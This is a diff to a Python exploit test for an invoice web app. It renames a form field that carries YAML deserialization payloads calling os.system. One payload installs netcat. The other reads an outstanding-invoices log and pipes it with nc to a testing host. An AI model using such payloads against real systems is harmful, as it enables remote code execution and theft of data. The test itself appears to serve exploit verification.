@@ -121,10 +121,10 @@ def test_exploit_add_invoice():
     proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)
 
     params = {'name': 'somebody', 'item': 'pizza',
-              'payment-method': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
+              'payment-type': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
     requests.post(URL + '/add', params)
     params = {'name': 'somebody', 'item': 'pizza',
-              'payment-method': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
+              'payment-type': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
     requests.post(URL + '/add', params)
 
     try:
